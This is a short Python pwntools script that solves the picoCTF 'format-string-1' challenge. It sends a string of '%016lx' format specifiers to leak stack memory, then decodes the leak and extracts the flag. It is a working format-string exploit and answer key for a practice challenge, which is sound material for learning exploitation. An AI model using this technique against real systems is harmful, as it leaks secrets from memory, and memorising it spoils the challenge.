#!/usr/bin/env python3

from pwn import *
import binascii
import re

p = process('./format-string-1')
# p = remote('mimas.picoctf.net', 62258)

p.sendlineafter(
    b'Give me your order and I\'ll read it back to you:', b'%016lx' * 30)
p.recvuntil(b'Here\'s your order:')
leak = p.recvline().strip()

decode = binascii.unhexlify(leak)
# Swap every 8 bytes to fix endianness
decode = b''.join([decode[i:i+8][::-1] for i in range(0, len(decode), 8)])
flag = re.findall(b'picoCTF{.*?}', decode)[0]
print(flag)
